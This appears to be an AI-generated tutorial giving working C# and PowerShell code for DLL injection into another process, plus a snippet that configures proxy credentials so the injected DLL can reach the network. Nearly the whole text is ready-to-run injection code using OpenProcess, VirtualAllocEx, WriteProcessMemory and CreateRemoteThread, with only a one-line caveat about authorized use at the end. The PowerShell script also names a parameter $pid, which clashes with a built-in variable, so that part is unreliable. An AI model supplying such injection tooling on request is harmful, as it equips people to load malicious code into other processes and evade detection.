
To create a proxy-aware DLL injection in C# or PowerShell, you'll need to perform the following steps:

1. **Locate the target process**.
2. **Allocate memory in the target process**.
3. **Write the path of the DLL into the allocated memory**.
4. **Create a remote thread in the target process that loads the DLL**.

Additionally, you need to configure the proxy settings in your code if your injection needs to communicate over the network.

Below is a simplified example in C# that performs DLL injection into a target process and sets proxy settings.

### C# Example

#### Step 1: Define necessary P/Invoke methods

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace ProxyAwareDLLInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 0x04;

        static void Main(string[] args)
        {
            int targetProcessId = 1234; // Replace with the target process ID
            string dllPath = @"C:\path\to\your.dll";

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open target process.");
                return;
            }

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("Failed to allocate memory in target process.");
                CloseHandle(hProcess);
                return;
            }

            byte[] dllPathBytes = Encoding.Unicode.GetBytes(dllPath);
            if (!WriteProcessMemory(hProcess, addr, dllPathBytes, (uint)dllPathBytes.Length, out IntPtr _))
            {
                Console.WriteLine("Failed to write memory in target process.");
                CloseHandle(hProcess);
                return;
            }

            IntPtr hKernel32 = GetModuleHandle("kernel32.dll");
            IntPtr hLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

            if (CreateRemoteThread(hProcess, IntPtr.Zero, 0, hLoadLibraryW, addr, 0, out IntPtr _) == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create remote thread in target process.");
                CloseHandle(hProcess);
                return;
            }

            Console.WriteLine("DLL injected successfully.");
            CloseHandle(hProcess);
        }
    }
}
```

#### Step 2: Configure Proxy Settings (if needed)

If your DLL requires network communication and needs to be proxy-aware, you can set proxy settings in your DLL code using `WebRequest` or `HttpClient`. Here's an example of setting proxy settings in a C# class:

```csharp
using System;
using System.Net;

namespace YourNamespace
{
    public class ProxyAwareClass
    {
        public void SetProxy()
        {
            WebRequest.DefaultWebProxy = new WebProxy("http://yourproxy:8080")
            {
                Credentials = new NetworkCredential("username", "password")
            };

            // Example of using HttpClient with proxy
            HttpClientHandler handler = new HttpClientHandler()
            {
                Proxy = new WebProxy("http://yourproxy:8080"),
                UseProxy = true,
                Credentials = new NetworkCredential("username", "password")
            };

            HttpClient client = new HttpClient(handler);
            // Use client to make network requests
        }
    }
}
```

### PowerShell Example

PowerShell can also be used to perform DLL injection, but it might be less common for complex tasks like setting proxy settings within the injected DLL.

```powershell
param (
    [int]$pid,
    [string]$dllPath
)

$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04

$kernel32 = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
"@ -Name 'Kernel32' -Namespace 'DllInjection' -PassThru

$hProcess = [DllInjection.Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Failed to open target process."
    exit
}

$dllPathBytes = [System.Text.Encoding]::Unicode.GetBytes($dllPath)
$addr = [DllInjection.Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]($dllPathBytes.Length), $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Host "Failed to allocate memory in target process."
    [DllInjection.Kernel32]::CloseHandle($hProcess)
    exit
}

$written = [IntPtr]::Zero
if (-not [DllInjection.Kernel32]::WriteProcessMemory($hProcess, $addr, $dllPathBytes, [uint32]$dllPathBytes.Length, [ref]$written)) {
    Write-Host "Failed to write memory in target process."
    [DllInjection.Kernel32]::CloseHandle($hProcess)
    exit
}

$hKernel32 = [DllInjection.Kernel32]::GetModuleHandle("kernel32.dll")
$hLoadLibraryW = [DllInjection.Kernel32]::GetProcAddress($hKernel32, "LoadLibraryW")
if ([DllInjection.Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $hLoadLibraryW, $addr, 0, [ref]$null) -eq [IntPtr]::Zero) {
    Write-Host "Failed to create remote thread in target process."
    [DllInjection.Kernel32]::CloseHandle($hProcess)
    exit
}

Write-Host "DLL injected successfully."
[DllInjection.Kernel32]::CloseHandle($hProcess)
```

This PowerShell script opens the target process, allocates memory for the DLL path, writes the DLL path into the allocated memory, and then creates a remote thread to load the DLL into the target process.

Remember, any kind of DLL injection is considered malicious and should only be used for legitimate purposes in a controlled and authorized environment, such as during penetration testing with proper permissions.